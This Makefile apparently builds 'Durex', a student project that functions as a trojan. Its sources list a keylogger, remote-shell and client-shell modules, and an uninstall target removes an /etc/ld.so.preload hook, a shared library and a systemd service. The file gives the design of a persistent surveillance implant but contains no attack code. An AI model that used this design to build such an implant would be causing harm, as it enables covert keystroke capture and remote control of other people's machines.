# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2018/01/12 20:15:31 by root              #+#    #+#              #
#    Updated: 2019/08/06 00:36:14 by gbourgeo         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

NAME	= Durex
SRC		= main.c					\
		client.c					\
		durex.c						\
		encrypt.c					\
		install.c					\
		library.c					\
		move.c						\
		quit.c						\
		reporter.c					\
		server.c					\
		server_connect_shell.c		\
		server_help.c				\
		server_keylogger.c			\
		server_log.c				\
		server_clear_log.c			\
		server_print_logs.c			\
		server_quit_client.c		\
		server_quit_client_shell.c	\
		server_remote_shell.c		\
		server_shell.c				\
		server_stats.c				\
		shell.c						\
		signal.c					\
		stdlib.c					\

SRC_KEY	= keylogger_init.c	\
		keylogger_loop.c	\
		handlers.c			\
		get_console.c		\
		get_keyboard.c		\
		get_keymaps.c		\
		get_keys.c			\
		get_keystate.c		\

OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
OBJ		+= $(addprefix $(OBJ_DIR), $(SRC_KEY:.c=.o))
DEP		= $(addprefix $(DEP_DIR), $(SRC:.c=.d))
DEP		+= $(addprefix $(DEP_DIR), $(SRC_KEY:.c=.d))
SRC_DIR	= srcs/
SRC_KEY_DIR = $(SRC_DIR)keylogger/
HDR_DIR = -I includes/
OBJ_DIR	= objs/
DEP_DIR = .deps/
ifdef X11
LIBS	= -lX11
endif
FLAGS	= -Wall -Werror -Wextra

all: $(OBJ_DIR) $(NAME)

$(OBJ_DIR):
	mkdir -p $@
	mkdir -p $(DEP_DIR)

$(NAME): $(OBJ)
	$(CC) -o $@ $^ $(LIBS)

$(OBJ_DIR)%.o: $(SRC_DIR)%.c
$(OBJ_DIR)%.o: $(SRC_DIR)%.c $(DEP_DIR)%.d
	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -o $@ -c $< $(HDR_DIR)
	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@

$(OBJ_DIR)shell.o: FLAGS += -D_XOPEN_SOURCE=600

$(OBJ_DIR)%.o: $(SRC_KEY_DIR)%.c
$(OBJ_DIR)%.o: $(SRC_KEY_DIR)%.c $(DEP_DIR)%.d
	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -o $@ -c $< $(HDR_DIR)
	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@

$(DEP_DIR)%.d: ;
.PRECIOUS: $@

-include $(DEP)

clean:
	/bin/rm -rf $(OBJ_DIR)
	/bin/rm -rf $(DEP_DIR)

fclean: clean
	/bin/rm -f $(NAME)

re: fclean all

rm:
	/bin/rm -f /etc/ld.so.preload
	/bin/rm -f /usr/local/lib/$(NAME).so
	@if test -f /lib/systemd/system/$(NAME).service; then \
	systemctl stop $(NAME) && \
	systemctl disable $(NAME) && \
	/bin/rm /lib/systemd/system/$(NAME).service && \
	echo rm $(NAME) service; \
	fi
	@if test -f /bin/$(NAME); then \
	rm /bin/$(NAME) && \
	echo rm $(NAME); \
	fi
	@if test -f /var/lock/$(NAME).lock; then \
	rm /var/lock/$(NAME).lock && \
	echo rm $(NAME) lock; \
	fi
	@if test -f /var/log/$(NAME).log; then \
	/bin/rm /var/log/$(NAME).log && \
	echo rm $(NAME) log; \
	fi

OTHER_D	= other/

PASS	= pass
PASS_C	= passwd.c encrypt.c
PASS_O	= $(addprefix $(OTHER_D), $(PASS_C:.c=.o))

$(PASS): $(PASS_O)
	$(CC) -o $@ $^
$(OTHER_D)%.o: $(OTHER_D)%.c
	$(CC) -o $@ -c $< $(HDR_DIR)
$(OTHER_D)%.o: $(SRC_DIR)%.c
	$(CC) -o $@ -c $< $(HDR_DIR)
passrm:
	/bin/rm $(PASS_O)
	/bin/rm $(PASS)

HEX		= hex
HEX_C	= txttohex.c
HEX_O	= $(addprefix $(OTHER_D), $(HEX_C:.c=.o))

$(HEX): $(HEX_O)
	$(CC) -o $@ $^
hexrm:
	/bin/rm $(HEX_O)
	/bin/rm $(HEX)

KEY		= key
KEY_C	= keylogger.c
KEY_O	= $(addprefix $(OTHER_D), $(KEY_C:.c=.o))

$(KEY): $(KEY_O) other/keys.h
	$(CC) -o $@ $^
keyrm:
	/bin/rm $(KEY_O)
	/bin/rm $(KEY)
